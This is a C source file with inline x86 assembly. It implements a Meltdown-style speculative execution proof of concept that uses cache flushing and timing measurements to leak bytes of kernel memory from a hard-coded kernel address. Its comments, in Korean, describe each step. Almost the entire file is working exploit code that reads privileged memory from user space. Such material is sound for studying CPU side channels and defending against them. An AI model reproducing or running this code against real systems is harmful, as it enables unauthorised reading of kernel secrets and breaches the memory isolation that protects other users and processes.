#include <stdio.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

extern void specu(void *, char (*)[4096]);
asm(
".section .text\n"
".global specu\n"
"specu:\n"
"	mfence\n"
"	call 1f\n"
"	movzbl (%rdi), %eax\n"
"	shll $12, %eax\n"
"	movq (%rax, %rsi), %rcx\n"
"1:	xorps %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	movd %xmm0, %eax\n"
"	lea 8(%rsp, %rax), %rsp\n"
"	ret\n"
);

extern unsigned long long measure_time(void const *);
asm(
".section .text\n"
".global measure_time\n"
"measure_time:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
"	mfence\n"
"	clflush (%rdi)\n"
"	retq\n"
);

void estimate_byte(void *addr) {
	char (*mapping)[PAGE_SIZE];
	mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(mapping == MAP_FAILED)
	{
		perror("mmap mapping");
		exit(-1);
	}
	memset(mapping, 0, PAGE_SIZE * 256);

	int hit_log[256] = {0,};
	int min = 99999;
	int min_val;

	int max_hit = 0;
	int max_hit_val;

	for(int j=0;j<100;j++) {
		min = 99999;

		for(int i=0; i<256; i++) {
			// flush
			clflush(mapping[i]);

			// 컨텍스트 스위칭/커널 모드 진입을 위한 인터럽트 
			syscall(0, -1, 0, 0);

			// 캐시 메모리에 커널 메모리 값 로드
			specu(addr, mapping);

			// 하나씩 로드해보면서 캐시된 값 찾기
			unsigned long long t = measure_time(mapping[i]);

			// 로드까지 가장 짧게 걸린 값 구하기
			if (t < min) {
				min = t;
				min_val = i;
			}
		}
		hit_log[min_val]++;
	}

	for(int i=0; i<256; i++) {
		if(max_hit < hit_log[i]) {
			max_hit = hit_log[i];
			max_hit_val = i;
		}
	}

	printf("%p : %x\n", addr, max_hit_val);
}


int main(int argc, char ** argv) {
	void *addr;
	addr = 0xffffffff81a00200;

	// 읽어들일 버퍼의 크기
	int len = 20;
	
	for(int i=0; i<20; i++){
		estimate_byte(addr + i);
	}
	return 0;
}